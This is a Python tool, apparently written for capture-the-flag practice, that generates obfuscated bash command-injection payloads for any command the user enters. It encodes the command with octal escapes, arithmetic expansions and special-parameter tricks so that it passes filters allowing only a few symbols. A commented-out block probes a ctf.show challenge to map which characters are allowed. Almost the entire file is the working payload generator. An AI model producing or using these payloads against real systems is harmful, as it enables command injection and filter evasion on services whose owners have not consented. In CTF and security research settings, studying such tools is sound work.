from string import printable


def info(s):
    total = 0
    used_chars = set()
    for c in s:
        if c.isprintable() and c not in used_chars:
            total += 1
            used_chars.add(c)
    return "Charset : " + ' '.join(sorted(used_chars)) + '\n' + f"Total Used: {total}" + '\n' + "Total length = " + str(
        len(s)) + '\n' + "Payload = " + s + '\n' + "---------------------------"


def GeneratePayload(char, cmd):
    list_1 = ['$', '\\', '\'', '0', '1', '2', '3', '4', '5', '6', '7', ' ']
    list_2 = ['#', '$', '\'', '(', ')', '0', '1', '<', '\\']
    list_3 = ['#', '$', '\'', '(', ')', '0', '<', '\\', '{', '}']
    list_4 = ['!', '$', '&', '\'', '(', ')', '<', '=', '\\', '_', '{', '}', '~']
    list_5 = ['!', '_', '?', '+', '$', '{', '}', '=', '#', '&', '(', ')', '<', '\'', '\\']
    list_6 = ['!', '_', '+', '$', '{', '}', '=', '#', '&', '(', ')', '<', '\'', '\\']

    if "'" not in char or "\\" not in char:
        print(f"必要字符不在列表中，无法生成payload")
        return
    elif all(c in char for c in list_1):
        print(payload_base(cmd))
    elif all(c in char for c in list_2):
        print(payload_2(cmd, 'num'))
    elif all(c in char for c in list_3):
        print(payload_2(cmd, 'not_one'))
    elif all(c in char for c in list_4):
        print(payload_3(cmd))
    elif all(c in char for c in list_5):
        print(payload_4(cmd, 'all'))
    elif all(c in char for c in list_6):
        print(payload_4(cmd, 'not_question_mark'))
    else:
        print("可用符号不足，以下是全部payload")
        print("---------------------------")
        # 输出全部payload
        print(payload_base(cmd))
        print(payload_2(cmd, 'num'))
        print(payload_2(cmd, 'not_one'))
        print(payload_3(cmd))
        print(payload_4(cmd, 'all'))
        print(payload_4(cmd, 'not_question_mark'))


def payload_base(cmd):
    payload = '$\''
    for c in cmd:
        if c == ' ':
            payload += '\' $\''
        else:
            payload += '\\' + (oct(ord(c)))[2:]
    payload += '\''

    return info(payload)


def payload_2(cmd, form):
    payload = ''
    for c in cmd:
        payload += f'\\\\$(($((1<<1))#{bin(int((oct(ord(c)))[2:]))[2:]}))'
    payload_num = payload
    payload_not_one = payload.replace('1', '${##}')  # 用 ${##} 来替换 1

    if form == 'num':
        payload_num = '$0<<<$0\\<\\<\\<\\$\\\'' + payload_num + '\\\''
        return info(payload_num)
    elif form == 'not_one':
        payload_not_one = '$0<<<$0\\<\\<\\<\\$\\\'' + payload_not_one + '\\\''
        return info(payload_not_one)


def payload_3(cmd):
    # 构造0-7的payload
    r = {}
    x = '$((~$(())))'  # -1
    r[0] = '$(())'  # 0
    for i in range(1, 9):
        r[i] = '$((~$((' + x
        for j in range(i):
            r[i] += x
        r[i] += '))))'

    payload = '__=$(())&&${!__}<<<${!__}\\<\\<\\<\\$\\\''
    for c in cmd:
        payload += '\\\\'
        for i in oct(ord(c))[2:]:
            payload += r[int(i)]
    payload += '\\\''

    return info(payload)


def payload_4(cmd, form):
    if form == 'all':
        payload = '__=${?}&&___=$((++__))&&____=$((++___))&&_____=${?}&&${!_____}<<<${!_____}\\<\\<\\<\\$\\\''
    elif form == 'not_question_mark':
        payload = '__=$(())&&___=$((++__))&&____=$((++___))&&_____=$(())&&${!_____}<<<${!_____}\\<\\<\\<\\$\\\''

    for c in cmd:
        payload += f'\\\\$((2#{bin(int(oct(ord(c))[2:]))[2:]}))'.replace('1', '${__}').replace('2', '${____}').replace(
            '0', '${_____}')

    payload += '\\\''

    return info(payload)


def main():
    try:
        char = input("请输入列表格式的可用字符，回车默认全部: ") or list(printable);
        if type(char) == str:
            char = eval(char)

        while True:
            cmd = input("输入想执行的命令: ")
            print("---------------------------")
            GeneratePayload(char, cmd)
    except:
        print("格式错误，请检查后重试")
        return


if __name__ == "__main__":
    # import requests
    #
    # url = "https://644e2b3a-87e4-45d0-bf87-ba9662bbcbbd.challenge.ctf.show/"
    # white_list = []
    # for i in range(1, 200):
    #     data = {
    #         "ctf_show": chr(i)
    #     }
    #     send = requests.post(url=url, data=data)
    #     if "??" in send.text:
    #         print(f"{chr(i)}")
    #     else:
    #         white_list.append(chr(i))
    #
    # print("white_list = " + str(white_list))

    main()
